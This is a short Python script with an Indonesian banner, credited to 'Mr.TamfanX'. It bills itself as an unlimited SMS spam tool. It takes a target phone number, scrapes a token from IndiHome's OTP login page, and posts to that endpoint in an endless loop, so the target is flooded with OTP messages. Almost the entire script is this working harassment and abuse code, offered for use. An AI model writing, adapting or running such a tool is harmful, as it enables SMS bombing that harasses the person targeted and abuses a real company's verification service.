#Pahami Kode Ini Jangan Cuman Recode
import re
import sys
import requests
import os
import time
import subprocess
def bersih():
    subprocess.call("clear",shell=True)
def thex(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./12)
def selesai():
    print ("Terima Kasih Telah Menggunakan Tools Ini:v")
    time.sleep(1)
    sys.exit()
def kembali():
    f = input("\x1b[1;92mcoba lagi?\x1b[1;97m (y/t): ")
    if f == "y":
       bersih()
       subprocess.call("python indihome.py",shell=True)
    elif f == "t":
         selesai()
    else:
         print ("Tidak ada input\x1b[1;91m!!!")
         time.sleep(2)
         subprocess.call("python indihome.py",shell=True)
bersih()
banner = """
\x1b[1;96m____ ___  ____ _  _    _ _  _ ___  _ _  _ ____ _  _ ____ 
[__  |__] |__| |\/|    | |\ | |  \ | |__| |  | |\/| |___ 
___] |    |  | |  |    | | \| |__/ | |  | |__| |  | |___ 
\x1b[1;97m=================================================
Author\x1b[1;91m:\x1b[1;96mMr.TamfanX\x1b[1;97m
Youtube\x1b[1;91m:\x1b[1;96mAnonymous 37\x1b[1;97m
Github\x1b[1;91m:\x1b[1;92mhttps://github.com/Anonymous3-SIT
\x1b[1;97m=================================================
"""
print (banner)
print ("\033[1;97m[\033[1;91mNOTE!!\033[1;97m]\033[037mSpam Sms UNLIMITED\n\033[90mCtrl+z \033[1;97mUntuk Stop\033[1;91m!!!")
s = requests.Session()
url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
no = input("\x1b[1;97m[\x1b[1;92mMasukan Nomor Target\x1b[1;97m] :\x1b[1;92m ")
token = s.get(url).text
token = re.findall(r"name=\"_token\" value=\"(.*?)\"", token)[0]
 
data = {
"_token":token,
"msisdn":no,
}
print ("\x1b[1;92mLoading\x1b[1;97m")
thex(">>>>>>>>>>>>>>>>>>>>>>")
while True:
    send = s.post(url, data=data).text
    if 'Failed!' or 'Sending' in send:
        print("\x1b[1;97m[\x1b[1;92mSuccess\x1b[1;97m]Send To:\x1b[1;97m[\x1b[1;92m",no,"\x1b[1;97m]")
    else:
        print("Sending Failed!!!")
        time.sleep(1)
        kembali()
